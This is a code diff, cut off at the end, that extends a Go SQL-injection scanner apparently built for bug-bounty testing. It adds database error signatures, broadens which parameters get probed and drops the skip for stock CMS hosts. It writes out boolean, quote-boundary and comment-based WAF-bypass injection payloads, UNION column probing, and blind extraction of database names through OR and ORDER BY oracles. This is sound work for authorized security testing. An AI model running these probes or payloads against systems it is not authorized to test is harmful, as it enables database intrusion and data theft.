@@ -7,6 +7,8 @@ import (
 	"net/http"
 	"net/url"
 	"regexp"
+	"sort"
+	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -43,18 +45,22 @@ var sqliHTTPClient = &http.Client{
 var sqlErrorSignatures = []*regexp.Regexp{
 	regexp.MustCompile(`(?i)SQL syntax.*MySQL`),
 	regexp.MustCompile(`(?i)Warning.*\Wmysqli?_`),
+	regexp.MustCompile(`(?i)mysql_(?:fetch|num_rows|query)\w*\(\).*expects parameter`),
 	regexp.MustCompile(`(?i)MySQLSyntaxErrorException`),
 	regexp.MustCompile(`(?i)check the manual that corresponds to your (MySQL|MariaDB) server version`),
 	regexp.MustCompile(`(?i)PostgreSQL.*ERROR`),
 	regexp.MustCompile(`(?i)pg_query\(\):`),
 	regexp.MustCompile(`(?i)unterminated quoted string at or near`),
+	regexp.MustCompile(`(?i)(?:pq:|Postgres(?:QL)? said:).*syntax error at or near`),
 	regexp.MustCompile(`(?i)Microsoft SQL Server`),
 	regexp.MustCompile(`(?i)Unclosed quotation mark after the character string`),
 	regexp.MustCompile(`(?i)ODBC SQL Server Driver`),
+	regexp.MustCompile(`(?i)(?:SQL Server|SqlException).*Incorrect syntax near`),
 	regexp.MustCompile(`(?i)ORA-[0-9]{5}`),
 	regexp.MustCompile(`(?i)Oracle error`),
 	regexp.MustCompile(`(?i)SQLite3?::`),
 	regexp.MustCompile(`(?i)sqlite3.OperationalError`),
+	regexp.MustCompile(`(?i)SQLITE_ERROR`),
 	regexp.MustCompile(`(?i)SQLSTATE\[`),
 	// DB2, Firebird, Sybase — rarer in bug-bounty scope but zero-cost to check
 	// for and previously entirely absent, so a hit on one of these engines was
@@ -65,6 +71,18 @@ var sqlErrorSignatures = []*regexp.Regexp{
 	regexp.MustCompile(`(?i)Firebird`),
 	regexp.MustCompile(`(?i)Sybase message`),
 	regexp.MustCompile(`(?i)SybSQLException`),
+	regexp.MustCompile(`(?i)org\.h2\.jdbc\.JdbcSQL(?:Syntax)?ErrorException`),
+	regexp.MustCompile(`(?i)org\.hsqldb\.HsqlException`),
+	regexp.MustCompile(`(?i)\[HDBODBC\].*(?:syntax error|invalid SQL)`),
+	regexp.MustCompile(`(?i)SAP DBTech JDBC: \[\d+\]:`),
+	regexp.MustCompile(`(?i)Informix.*(?:SQL error|syntax error)`),
+	regexp.MustCompile(`(?i)com\.informix\.jdbc`),
+	regexp.MustCompile(`(?i)\[Vertica\](?:\[VJDBC\])?`),
+	regexp.MustCompile(`(?i)DB::Exception:.*(?:Syntax error|Cannot parse)`),
+	regexp.MustCompile(`(?i)ClickHouse exception`),
+	regexp.MustCompile(`(?i)SQL compilation error:`), // Snowflake
+	regexp.MustCompile(`(?i)(?:io\.trino|io\.prestosql)\..*Exception`),
+	regexp.MustCompile(`(?i)CockroachDB.*(?:syntax error|SQLSTATE)`),
 	// Additional driver/ORM/framework error strings sqlmap ships in its errors.xml
 	// — these surface a DB error through the app's stack even when the raw engine
 	// message is wrapped. Still specific enough that a match after quote injection
@@ -84,6 +102,11 @@ var sqlErrorSignatures = []*regexp.Regexp{
 	regexp.MustCompile(`(?i)Doctrine\\DBAL`),
 	regexp.MustCompile(`(?i)SQLSTATE\[\w+\]\s*\[\d+\]`),
 	regexp.MustCompile(`(?i)PDOException`),
+	regexp.MustCompile(`(?i)java\.sql\.SQLSyntaxErrorException`),
+	regexp.MustCompile(`(?i)org\.hibernate\.(?:exception\.)?SQLGrammarException`),
+	regexp.MustCompile(`(?i)ActiveRecord::StatementInvalid`),
+	regexp.MustCompile(`(?i)django\.db\.utils\.(?:ProgrammingError|OperationalError)`),
+	regexp.MustCompile(`(?i)SequelizeDatabaseError`),
 }
 
 // SQLi-prone parameter names — these carry DB lookups far more often than others.
@@ -120,7 +143,10 @@ var sqliProneParams = map[string]bool{
 	"account_id": true, "profile_id": true, "group_id": true, "role_id": true,
 }
 
-const sqliMaxParams = 200 // hard cap so scan time stays bounded
+// sqliFallbackMaxParams is used only by unit tests/standalone callers that do
+// not provide Config. A real scan follows Config.URLLimit(); its default is
+// effectively unlimited, so every distinct discovered insertion point is tested.
+const sqliFallbackMaxParams = 2000
 
 // Value-shape signatures for DB-lookup-like GET parameters (see selectCandidates).
 var (
@@ -145,12 +171,12 @@ func looksLikeDBLookup(val string) bool {
 		reLookupHexID.MatchString(v) || reLookupNumSep.MatchString(v)
 }
 
-// Run performs fast, targeted SQLi checks: only numeric / SQLi-prone GET params,
-// plus Cookie and User-Agent header injection on a sample of live hosts.
+// Run performs deterministic SQLi checks over every discovered insertion point,
+// prioritising likely DB-backed fields without excluding unfamiliar names.
 // Deterministic tests per candidate (error-based + boolean/content + arithmetic),
 // plus out-of-band blind SQLi. No time-based verdicts. Then move on.
 func (s *SQLiScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
-	logFn("info", "sqli", "Starting targeted SQLi checks (numeric/prone GET params + headers)...")
+	logFn("info", "sqli", "Starting SQLi checks across query, path, form, JSON and header insertion points...")
 
 	candidates := s.selectCandidates(ctx, targetID)
 	logFn("info", "sqli", fmt.Sprintf("Selected %d high-value insertion points for SQLi testing", len(candidates)))
@@ -172,10 +198,10 @@ func (s *SQLiScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 			defer wg.Done()
 			defer func() { <-sem }()
 			if kind, ev := s.quickProbe(ctx, ip, auth); kind != "" {
-				s.store(targetID, "sqli", "high", ip.URL, ip.Param, kind, ev+" ["+ip.Method+"]")
+				s.store(targetID, "sqli", "high", ip, kind, ev+" ["+ip.Method+"/"+insertionLocation(ip)+"]")
 				found.Add(1)
 				flaggedMu.Lock()
-				flagged[ip.URL+"|"+ip.Param] = true
+				flagged[insertionIdentity(ip)] = true
 				flaggedMu.Unlock()
 				logFn("warn", "sqli", fmt.Sprintf("SQLi (%s): %s param=%s [%s]", kind, ip.URL, ip.Param, ip.Method))
 				s.notify(targetID, ip.URL, ip.Param)
@@ -196,8 +222,9 @@ func (s *SQLiScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 	// — an injection whose sink runs on a later, different request.
 	s.secondOrderChecks(ctx, targetID, candidates, auth, &found, logFn)
 
-	// Header-based (Cookie / User-Agent) on a small sample of live hosts.
-	s.headerChecks(ctx, targetID, logFn, &found)
+	// Header/cookie insertion points use the same error/boolean/extraction/timing
+	// proof ladder and preserve the authenticated identity.
+	s.headerChecks(ctx, targetID, auth, logFn, &found)
 
 	// Blind (out-of-band) SQLi — the SQLi objective OWNS its blind confirmation via
 	// the shared OOB capability: DB functions that make the SERVER itself reach our
@@ -218,7 +245,7 @@ func (s *SQLiScanner) plantBlindSQLi(ctx context.Context, targetID string, logFn
 	if !ok {
 		return
 	}
-	points := loadInsertionPoints(ctx, s.db, targetID, s.cfg.URLLimit())
+	points := s.selectCandidates(ctx, targetID)
 	if len(points) == 0 {
 		return
 	}
@@ -231,103 +258,233 @@ func (s *SQLiScanner) plantBlindSQLi(ctx context.Context, targetID string, logFn
 	}
 }
 
-// selectCandidates keeps only numeric-valued or SQLi-prone-named params (GET
-// query or POST form), deduped, capped for speed.
+// selectCandidates returns every distinct, in-scope insertion point. Likely
+// DB-backed parameters are sorted first so a user-supplied module limit spends
+// its budget well, but an unfamiliar string parameter is never silently thrown
+// away. CMS routes and analytics-looking names remain eligible: plugins/themes
+// and logging/attribution tables are real SQL sinks, and proof is differential.
 func (s *SQLiScanner) selectCandidates(ctx context.Context, targetID string) []insertionPoint {
 	rows, err := s.db.QueryContext(ctx, `
-		SELECT DISTINCT url, parameter, value, COALESCE(method,'GET'), COALESCE(content_type,''), COALESCE(location,'query')
+		SELECT url, parameter, COALESCE(value,''), COALESCE(method,'GET'),
+		       COALESCE(content_type,''), COALESCE(location,'query'), COALESCE(is_reflected,0)
 		FROM parameters WHERE target_id = ?
+		ORDER BY COALESCE(is_reflected,0) DESC, url, parameter
 	`, targetID)
 	if err != nil {
 		return nil
 	}
 	defer rows.Close()
 
-	numeric := regexp.MustCompile(`^\d+$`)
+	type rankedIP struct {
+		ip        insertionPoint
+		priority  int
+		reflected int
+	}
+	numeric := regexp.MustCompile(`^[+-]?\d+(?:\.\d+)?$`)
 	seen := make(map[string]bool)
-	// Stock WordPress/Joomla/Drupal hosts: skip active SQLi — the core is patched
-	// and blindly fuzzing it is a false-positive magnet (nuclei's CMS templates
-	// still cover the real known-CVE surface).
-	cmsSkip := loadCMSSkipHosts(s.db, targetID)
-	var out []insertionPoint
+	siblingGroups := make(map[string]map[string]string)
+	siblingTypeGroups := make(map[string]map[string]string)
+	var ranked []rankedIP
 	for rows.Next() {
 		var ip insertionPoint
-		var val string
-		if err := rows.Scan(&ip.URL, &ip.Param, &val, &ip.Method, &ip.ContentType, &ip.Location); err != nil {
+		var reflected int
+		if err := rows.Scan(&ip.URL, &ip.Param, &ip.Value, &ip.Method, &ip.ContentType, &ip.Location, &reflected); err != nil {
 			continue
 		}
-		if hostSkippedByCMS(ip.URL, cmsSkip) {
+		ip.Method = strings.ToUpper(strings.TrimSpace(ip.Method))
+		if ip.Method == "" {
+			ip.Method = "GET"
+		}
+		if ip.Param == "" || !urlHostInScope(ctx, ip.URL) {
 			continue
+		}
+		groupKey := sqliSiblingGroupKey(ip)
+		loc := insertionLocation(ip)
+		if loc == "body" || loc == "json" || loc == "multipart" || loc == "xml" || strings.HasPrefix(loc, "graphql:") {
+			if siblingGroups[groupKey] == nil {
+				siblingGroups[groupKey] = map[string]string{}
+			}
+			siblingGroups[groupKey][ip.Param] = ip.Value
+			if typ := jsonTypeFromLocation(ip.Location); typ != "" {
+				if siblingTypeGroups[groupKey] == nil {
+					siblingTypeGroups[groupKey] = map[string]string{}
+				}
+				siblingTypeGroups[groupKey][ip.Param] = typ
+			}
 		}
 		lname := strings.ToLower(ip.Param)
-		// POST/form fields are always worth testing; GET only if the value is
-		// numeric, the name is SQLi-prone, OR the value has the SHAPE of a DB lookup
-		// key (UUID, date, hex id, composite numeric). That last class is where a lot
-		// of real-world SQLi hides — e.g. ?ref=2024-01-02 or ?token=deadbeef feeding
-		// a WHERE clause — and a name/numeric-only filter walks right past it.
-		if ip.Method != "POST" && !numeric.MatchString(strings.TrimSpace(val)) &&
-			!sqliProneParams[lname] && !looksLikeDBLookup(val) {
-			continue
-		}
-		parsed, err := url.Parse(ip.URL)
-		if err != nil {
-			continue
-		}
-		key := ip.Method + parsed.Host + parsed.Path + "?" + ip.Param + "|" + ip.Location
+		key := insertionIdentity(ip)
 		if seen[key] {
 			continue
 		}
 		seen[key] = true
-		out = append(out, ip)
-		if len(out) >= sqliMaxParams {
-			break
+		priority := reflected * 10
+		if sqliProneParams[lname] {
+			priority += 100
 		}
+		if numeric.MatchString(strings.TrimSpace(ip.Value)) {
+			priority += 80
+		} else if looksLikeDBLookup(ip.Value) {
+			priority += 60
+		}
+		switch insertionLocation(ip) {
+		case "json":
+			priority += 50
+		case "multipart":
+			priority += 45
+		case "xml":
+			priority += 45
+		case "body":
+			priority += 40
+		case "path":
+			priority += 35
+		default:
+			if strings.HasPrefix(insertionLocation(ip), "path:") {
+				priority += 35
+			}
+		}
+		ranked = append(ranked, rankedIP{ip: ip, priority: priority, reflected: reflected})
+	}
+	for i := range ranked {
+		ip := &ranked[i].ip
+		groupKey := sqliSiblingGroupKey(*ip)
+		if group := siblingGroups[groupKey]; len(group) > 0 {
+			ip.Siblings = make(map[string]string, len(group))
+			for k, v := range group {
+				ip.Siblings[k] = v
+			}
+		}
+		if types := siblingTypeGroups[groupKey]; len(types) > 0 {
+			ip.SiblingTypes = make(map[string]string, len(types))
+			for k, v := range types {
+				ip.SiblingTypes[k] = v
+			}
+		}
+	}
+	sort.SliceStable(ranked, func(i, j int) bool {
+		if ranked[i].priority != ranked[j].priority {
+			return ranked[i].priority > ranked[j].priority
+		}
+		return insertionIdentity(ranked[i].ip) < insertionIdentity(ranked[j].ip)
+	})
+	limit := sqliFallbackMaxParams
+	if s.cfg != nil {
+		limit = s.cfg.URLLimit()
+	}
+	if limit <= 0 || limit > len(ranked) {
+		limit = len(ranked)
+	}
+	out := make([]insertionPoint, 0, limit)
+	for _, r := range ranked[:limit] {
+		out = append(out, r.ip)
 	}
 	return out
 }
 
+func jsonTypeFromLocation(location string) string {
+	loc := strings.ToLower(strings.TrimSpace(location))
+	if strings.HasPrefix(loc, "json:") {
+		return strings.TrimPrefix(loc, "json:")
+	}
+	return ""
+}
+
+func sqliSiblingGroupKey(ip insertionPoint) string {
+	loc := insertionLocation(ip)
+	if strings.HasPrefix(loc, "graphql:") {
+		parts := strings.Split(loc, ":")
+		if len(parts) >= 3 {
+			loc = strings.Join(parts[:3], ":") // same endpoint + operation
+		}
+	}
+	return strings.ToUpper(ip.Method) + "\x00" + ip.URL + "\x00" +
+		strings.ToLower(ip.ContentType) + "\x00" + loc
+}
+
+// sqliBaseValue keeps the request on the originally discovered object/route.
+// Empty form fields have no useful baseline, so use a conservative numeric seed.
+func sqliBaseValue(ip insertionPoint) string {
+	if v := strings.TrimSpace(ip.Value); v != "" && len(v) <= 256 {
+		return v
+	}
+	if idx, ok := isPathLocation(ip.Location); ok {
+		if u, err := url.Parse(ip.URL); err == nil {
+			segs := strings.Split(strings.Trim(u.Path, "/"), "/")
+			if idx >= 0 && idx < len(segs) && segs[idx] != "" {
+				return segs[idx]
+			}
+		}
+	}
+	return "1"
+}
+
+type sqliBooleanPair struct{ tru, fls, condFmt string }
+
+// sqliBooleanPairs applies each boundary to the real baseline value. This keeps
+// UUID/string/date routes valid while still covering numeric, quoted, parenthesis
+// and comment-filter contexts.
+func sqliBooleanPairs(ip insertionPoint) []sqliBooleanPair {
+	b := sqliBaseValue(ip)
+	return []sqliBooleanPair{
+		{b + " AND 1=1", b + " AND 1=2", b + " AND (%s)"},
+		{b + "' AND '1'='1", b + "' AND '1'='2", b + "' AND (%s) AND '1'='1"},
+		{b + " AND 1=1-- -", b + " AND 1=2-- -", b + " AND (%s)-- -"},
+		{b + " AND 1=1#", b + " AND 1=2#", b + " AND (%s)#"},
+		{b + "' AND '1'='1'#", b + "' AND '1'='2'#", b + "' AND (%s)#"},
+		{b + `" AND "1"="1`, b + `" AND "1"="2`, b + `" AND (%s) AND "1"="1`},
+		{b + ") AND (1=1)-- -", b + ") AND (1=2)-- -", b + ") AND (%s)-- -"},
+		{b + ")) AND ((1=1))-- -", b + ")) AND ((1=2))-- -", b + ")) AND (%s)-- -"},
+		{b + "') AND ('1'='1", b + "') AND ('1'='2", b + "') AND (%s) AND ('1'='1"},
+		{b + "/**/aNd/**/1=1", b + "/**/aNd/**/1=2", b + "/**/aNd/**/(%s)"},
+		{b + "'/**/aNd/**/'1'='1", b + "'/**/aNd/**/'1'='2", b + "'/**/aNd/**/(%s)/**/aNd/**/'1'='1"},
+	}
+}
+
+func sqliArithmeticPairs(ip insertionPoint) (eq, diff, eq2, diff2, condFmt string, ok bool) {
+	n, err := strconv.ParseInt(strings.TrimSpace(sqliBaseValue(ip)), 10, 64)
+	if err != nil || n > 1_000_000_000 || n < -1_000_000_000 {
+		return "", "", "", "", "", false
+	}
+	return fmt.Sprintf("%d-1", n+1), fmt.Sprintf("%d-1", n+2),
+		fmt.Sprintf("%d-3", n+3), fmt.Sprintf("%d-3", n+4),
+		fmt.Sprintf("%d AND (%%s)", n), true
+}
+
 // quickProbe: error-based + blind boolean/content + arithmetic differential,
-// each reproduced before it counts. Fast and precise — deterministic signals
-// only; no time-based verdicts (blind SQLi is proven out-of-band elsewhere).
+// each reproduced before it counts. This fast stage is deterministic; the
+// statistical time-based proof runs separately at low concurrency.
 func (s *SQLiScanner) quickProbe(ctx context.Context, ip insertionPoint, auth map[string]string) (string, string) {
-	// Error-based: baseline vs quote-injected.
-	base, _ := sendInjected(ctx, sqliHTTPClient, ip, "1", auth)
-	errResp, _ := sendInjected(ctx, sqliHTTPClient, ip, "1'\"`", auth)
-	for _, sig := range sqlErrorSignatures {
-		if !sig.MatchString(errResp) || sig.MatchString(base) {
+	baselineValue := sqliBaseValue(ip)
+	// Error-based: try quote/identifier/parenthesis boundaries independently. A
+	// single payload containing every quote type is easy for a WAF to block and can
+	// be syntactically invalid in a way that hides the engine's useful error.
+	base, baseStatus, _ := sendInjectedFull(ctx, sqliHTTPClient, ip, baselineValue, auth)
+	for _, suffix := range []string{"'", `"`, "`", "')", `\")`, "\\"} {
+		injected := baselineValue + suffix
+		errResp, errStatus, _ := sendInjectedFull(ctx, sqliHTTPClient, ip, injected, auth)
+		if looksLikeBlockPage(errStatus, errResp) {
 			continue
 		}
-		// FP guard 1: a WAF/challenge page is often served ONLY for the quote-bearing
-		// payload and can carry SQL-ish text — that is a block, not a DB error. (The
-		// benign "1" baseline passes the WAF, so the naive differential fires.)
-		if bodyLooksLikeWAFBlock(errResp) {
-			break
-		}
-		// FP guard 2: reproduce. A transient 500 (unrelated load, a flaky upstream)
-		// can flash a DB error exactly once. Require the SAME signature on a second
-		// injection AND still absent from a fresh baseline before trusting it.
-		base2, _ := sendInjected(ctx, sqliHTTPClient, ip, "1", auth)
-		errResp2, _ := sendInjected(ctx, sqliHTTPClient, ip, "1'\"`", auth)
-		if !sig.MatchString(errResp2) || sig.MatchString(base2) {
-			break
-		}
-		{
-			evidence := "DB error triggered by quote injection (reproduced; absent from baseline)"
+		for _, sig := range sqlErrorSignatures {
+			if !sig.MatchString(errResp) || sig.MatchString(base) {
+				continue
+			}
+			// Reproduce against a fresh baseline: a one-shot upstream 500 is not SQLi.
+			base2, _, _ := sendInjectedFull(ctx, sqliHTTPClient, ip, baselineValue, auth)
+			errResp2, errStatus2, _ := sendInjectedFull(ctx, sqliHTTPClient, ip, injected, auth)
+			if !sig.MatchString(errResp2) || sig.MatchString(base2) || looksLikeBlockPage(errStatus2, errResp2) {
+				continue
+			}
+			evidence := fmt.Sprintf("DB error triggered by boundary %q (reproduced; absent from baseline)", suffix)
 			if dbms := fingerprintDBMS(errResp); dbms != "" {
 				evidence += " — engine: " + dbms
 			}
-			// UNION enrichment — ONLY runs on a parameter already PROVEN
-			// vulnerable above, so it can never introduce a new false
-			// positive; it just turns "an error appeared" into "here is the
-			// exact column count and a UNION SELECT PoC that reflects a
-			// marker in the response", a much stronger report artifact.
-			if cols := s.unionColumnCount(ctx, ip, auth); cols > 0 {
-				if pos, payload := s.unionMarkerColumn(ctx, ip, auth, cols); pos > 0 {
-					evidence = fmt.Sprintf("%s; UNION-based PROVEN: %d column(s), marker reflects in column %d — PoC: %s",
-						evidence, cols, pos, payload)
+			// UNION enrichment runs only on an already-proven parameter.
+			if cols, unionFmt := s.unionColumnBoundary(ctx, ip, auth); cols > 0 {
+				if pos, payload := s.unionMarkerColumnWithTemplate(ctx, ip, auth, cols, unionFmt); pos > 0 {
+					evidence = fmt.Sprintf("%s; UNION-based PROVEN: %d column(s), marker reflects in column %d — PoC: %s", evidence, cols, pos, payload)
 				} else {
-					evidence = fmt.Sprintf("%s; UNION column count likely %d (marker reflection not confirmed — output may not be rendered directly)",
-						evidence, cols)
+					evidence = fmt.Sprintf("%s; UNION column count likely %d (marker reflection not confirmed — output may not be rendered directly)", evidence, cols)
 				}
 			}
 			return "error_based", evidence
@@ -353,7 +510,7 @@ func (s *SQLiScanner) quickProbe(ctx context.Context, ip insertionPoint, auth ma
 	// constants — a dynamic page that wobbles hundreds of bytes on its own no
 	// longer trips the boolean differential. Also a WAF gate: if the benign
 	// baseline itself is a block/challenge page, boolean testing is meaningless.
-	vol := measureVolatility(ctx, sqliHTTPClient, ip, auth, "1")
+	vol := measureVolatility(ctx, sqliHTTPClient, ip, auth, baselineValue)
 	if vol.blocked {
 		return "", ""
 	}
@@ -368,7 +525,7 @@ func (s *SQLiScanner) quickProbe(ctx context.Context, ip insertionPoint, auth ma
 	// FPs). Bail out of length-differential testing for such endpoints — error- and
 	// error-based detection is unaffected because it does not rely on response size.
 	const sqliBodyCap = 512 * 1024
-	booleanReliable := baseLen > 0 && baseLen < sqliBodyCap && vol.valid &&
+	booleanReliable := baseStatus != 0 && baseLen < sqliBodyCap && vol.valid &&
 		vol.baseLen < sqliBodyCap &&
 		(vol.baseLen == 0 || vol.noise <= vol.baseLen/8) && vol.noise <= 20000
 
@@ -382,27 +539,11 @@ func (s *SQLiScanner) quickProbe(ctx context.Context, ip insertionPoint, auth ma
 		// differential is only reported after blindExtractDBName USES that oracle to
 		// read the current database name — a bare differential (CDN/id→object
 		// endpoints) extracts nothing and is dropped as a false positive.
-		type bpair struct{ tru, fls, condFmt string }
-		for _, pair := range []bpair{
-			{"1 AND 1=1", "1 AND 1=2", "1 AND (%s)"},
-			{"1' AND '1'='1", "1' AND '1'='2", "1' AND (%s) AND '1'='1"},
-			{"1 AND 1=1-- -", "1 AND 1=2-- -", "1 AND (%s)-- -"},
-			{`1" AND "1"="1`, `1" AND "1"="2`, `1" AND (%s) AND "1"="1`},
-			// Parenthesis boundaries (query wraps the value in parens) — sqlmap's
-			// boundary set. Catches WHERE (id=$p) / functions like IN($p).
-			{"1) AND (1=1)-- -", "1) AND (1=2)-- -", "1) AND (%s)-- -"},
-			{"1)) AND ((1=1))-- -", "1)) AND ((1=2))-- -", "1)) AND (%s)-- -"},
-			{"1') AND ('1'='1", "1') AND ('1'='2", "1') AND (%s) AND ('1'='1"},
-			// Inline-comment + mixed-case keyword-filter bypass: a WAF/blocklist that
-			// drops the literal "AND 1=1" often still lets "/**/aNd/**/1=1" through,
-			// so an injection sitting behind such a filter is invisible to the plain
-			// pairs above but caught here — a common real-world WAF-bypass SQLi.
-			{"1/**/aNd/**/1=1", "1/**/aNd/**/1=2", "1/**/aNd/**/(%s)"},
-			{"1'/**/aNd/**/'1'='1", "1'/**/aNd/**/'1'='2", "1'/**/aNd/**/(%s)/**/aNd/**/'1'='1"},
-		} {
-			tResp, _ := sendInjected(ctx, sqliHTTPClient, ip, pair.tru, auth)
-			fResp, _ := sendInjected(ctx, sqliHTTPClient, ip, pair.fls, auth)
-			if len(tResp) == 0 || len(fResp) == 0 {
+		for _, pair := range sqliBooleanPairs(ip) {
+			tr := sendInjectedResponse(ctx, sqliHTTPClient, ip, pair.tru, auth)
+			fr := sendInjectedResponse(ctx, sqliHTTPClient, ip, pair.fls, auth)
+			tResp, fResp := tr.Body, fr.Body
+			if tr.Status == 0 || fr.Status == 0 {
 				continue
 			}
 			// If either response hit the read cap it's truncated → size is unreliable.
@@ -411,29 +552,33 @@ func (s *SQLiScanner) quickProbe(ctx context.Context, ip insertionPoint, auth ma
 			}
 			// A block/challenge page carries a per-request id → its size wobbles like a
 			// real boolean signal. Never derive a finding from one.
-			if bodyLooksLikeWAFBlock(tResp) || bodyLooksLikeWAFBlock(fResp) {
+			if looksLikeBlockPage(tr.Status, tResp) || looksLikeBlockPage(fr.Status, fResp) {
 				continue
 			}
 			// Require: TRUE ~ baseline, FALSE differs from BOTH the TRUE response AND
 			// the baseline (a parameter that merely changes the page on any value would
 			// only satisfy the first).
-			trueLikeBase := vol.matchesBaseline(len(tResp))
-			falseDiffers := abs(len(tResp)-len(fResp)) > vol.sigDiff(200) &&
-				abs(len(fResp)-baseLen) > vol.sigDiff(200)
+			trueLikeBase := tr.Status == baseStatus && vol.matchesBaseline(len(tResp))
+			falseDiffers := fr.Status != baseStatus ||
+				(abs(len(tResp)-len(fResp)) > vol.sigDiff(200) && abs(len(fResp)-baseLen) > vol.sigDiff(200))
 			if trueLikeBase && falseDiffers {
 				// Confirm: repeat once, and check the pattern holds (guards dynamic pages).
-				t2, _ := sendInjected(ctx, sqliHTTPClient, ip, pair.tru, auth)
-				f2, _ := sendInjected(ctx, sqliHTTPClient, ip, pair.fls, auth)
-				if abs(len(t2)-len(f2)) > vol.sigDiff(200) && vol.matchesBaseline(len(t2)) &&
-					abs(len(f2)-baseLen) > vol.sigDiff(200) {
+				t2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, pair.tru, auth)
+				f2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, pair.fls, auth)
+				reproducedFalse := f2.Status != baseStatus ||
+					(abs(len(t2.Body)-len(f2.Body)) > vol.sigDiff(200) && abs(len(f2.Body)-baseLen) > vol.sigDiff(200))
+				if t2.Status == baseStatus && vol.matchesBaseline(len(t2.Body)) && reproducedFalse &&
+					!looksLikeBlockPage(f2.Status, f2.Body) {
 					// PROVE it: use the oracle to extract the current database name. A bare
 					// size differential that cannot extract is NOT reported (it is the
 					// dominant blind-boolean false positive).
-					isTrueLike := func(r []byte) bool { return vol.matchesBaseline(len(r)) }
-					if name, dbms, ok := s.blindExtractDBName(ctx, ip, auth, pair.condFmt, isTrueLike); ok {
+					isTrueLike := func(r injectedResponse) bool {
+						return r.Status == baseStatus && vol.matchesBaseline(len(r.Body))
+					}
+					if name, dbms, ok := s.blindExtractDBNameResponse(ctx, ip, auth, pair.condFmt, isTrueLike); ok {
 						return "boolean_based", fmt.Sprintf(
-							"blind boolean SQLi on param %q — PROVEN by extraction: current database = %q (%s). TRUE payload %q → %dB (~baseline %dB); FALSE payload %q → %dB (differs). Endpoint noise floor %dB. Verify: %s",
-							ip.Param, name, dbms, pair.tru, len(tResp), baseLen, pair.fls, len(fResp), vol.noise, mkSQLmapCmd())
+							"blind boolean SQLi on param %q — PROVEN by extraction: %s. TRUE payload %q → %dB (~baseline %dB); FALSE payload %q → %dB (differs). Endpoint noise floor %dB. Verify: %s",
+							ip.Param, blindSQLProofDescription(name, dbms), pair.tru, len(tResp), baseLen, pair.fls, len(fResp), vol.noise, mkSQLmapCmd())
 					}
 				}
 			}
@@ -450,21 +595,47 @@ func (s *SQLiScanner) quickProbe(ctx context.Context, ip insertionPoint, auth ma
 			// baseline (so it fails the FALSE-differs test). Reproduced once, and gated
 			// by the stable-page precondition (booleanReliable) so a dynamic page
 			// cannot trip it.
-			if bodiesSameObject(base, tResp) && !bodiesSameObject(base, fResp) {
-				t2, _ := sendInjected(ctx, sqliHTTPClient, ip, pair.tru, auth)
-				f2, _ := sendInjected(ctx, sqliHTTPClient, ip, pair.fls, auth)
-				if bodiesSameObject(base, t2) && !bodiesSameObject(base, f2) {
+			if tr.Status == baseStatus && bodiesSameObject(base, tResp) &&
+				(fr.Status != baseStatus || !bodiesSameObject(base, fResp)) {
+				t2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, pair.tru, auth)
+				f2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, pair.fls, auth)
+				if t2.Status == baseStatus && bodiesSameObject(base, t2.Body) &&
+					(f2.Status != baseStatus || !bodiesSameObject(base, f2.Body)) &&
+					!looksLikeBlockPage(f2.Status, f2.Body) {
 					// PROVE it via extraction through the object-identity oracle. This is the
 					// path that used to FP on CDN/id→object endpoints (the aparat.com report):
 					// they render different objects for different ids but expose no SQL, so
 					// extraction fails and no finding is emitted.
-					isTrueLike := func(r []byte) bool { return bodiesSameObject(base, string(r)) }
-					if name, dbms, ok := s.blindExtractDBName(ctx, ip, auth, pair.condFmt, isTrueLike); ok {
+					isTrueLike := func(r injectedResponse) bool {
+						return r.Status == baseStatus && bodiesSameObject(base, r.Body)
+					}
+					if name, dbms, ok := s.blindExtractDBNameResponse(ctx, ip, auth, pair.condFmt, isTrueLike); ok {
 						return "boolean_based", fmt.Sprintf(
-							"blind boolean SQLi on param %q (content-differential oracle) — PROVEN by extraction: current database = %q (%s). TRUE payload %q renders the baseline object while FALSE %q renders a different one, and the oracle exfiltrated the DB name. Verify: %s",
-							ip.Param, name, dbms, pair.tru, pair.fls, mkSQLmapCmd())
+							"blind boolean SQLi on param %q (content-differential oracle) — PROVEN by extraction: %s. TRUE payload %q renders the baseline object while FALSE %q renders a different one, and the oracle exfiltrated a DB-computed value. Verify: %s",
+							ip.Param, blindSQLProofDescription(name, dbms), pair.tru, pair.fls, mkSQLmapCmd())
 					}
 				}
+			}
+		}
+
+		// When the discovered value does not select a row, an AND oracle has no
+		// visible channel: both TRUE and FALSE return the same empty result. OR-based
+		// boundaries invert that geometry (TRUE selects rows, FALSE stays empty).
+		if value, dbms, tru, fls, ok := s.orBasedBlindExtract(ctx, ip, auth); ok {
+			return "boolean_based", fmt.Sprintf(
+				"OR-based blind SQLi on param %q — PROVEN by extraction: %s. TRUE payload %q and FALSE payload %q formed a stable two-sided oracle even though the original value selected no row. Verify: %s",
+				ip.Param, blindSQLProofDescription(value, dbms), tru, fls, mkSQLmapCmd())
+		}
+
+		// ORDER BY / sort-expression SQLi is not a WHERE predicate: appending
+		// "AND 1=1" can be invalid even when the value is injectable. Build a
+		// CASE-based ordering oracle and, as with the regular boolean path, report
+		// only after it extracts a DB-computed value through that oracle.
+		if isOrderByParameter(ip.Param) {
+			if value, dbms, tru, fls, ok := s.orderByBlindExtract(ctx, ip, auth); ok {
+				return "boolean_based", fmt.Sprintf(
+					"ORDER BY expression SQLi on param %q — PROVEN by CASE-order oracle and extraction: %s. TRUE ordering payload %q and FALSE payload %q produced two stable result orders; arbitrary DB conditions were then extracted through the same oracle. Verify: %s",
+					ip.Param, blindSQLProofDescription(value, dbms), tru, fls, mkSQLmapCmd())
 			}
 		}
 
@@ -475,35 +646,138 @@ func (s *SQLiScanner) quickProbe(ctx context.Context, ip insertionPoint, auth ma
 		// "1" baseline and nothing matches. Catches numeric-context injections that
 		// never error or sleep and that reject the AND/OR keywords a WAF/keyword
 		// filter blocks — a classic real-world SQLi a keyword-only check misses.
-		eq, _ := sendInjected(ctx, sqliHTTPClient, ip, "2-1", auth)  // = 1
-		dif, _ := sendInjected(ctx, sqliHTTPClient, ip, "3-1", auth) // = 2
-		if len(eq) > 0 && len(dif) > 0 && len(eq) < sqliBodyCap && len(dif) < sqliBodyCap &&
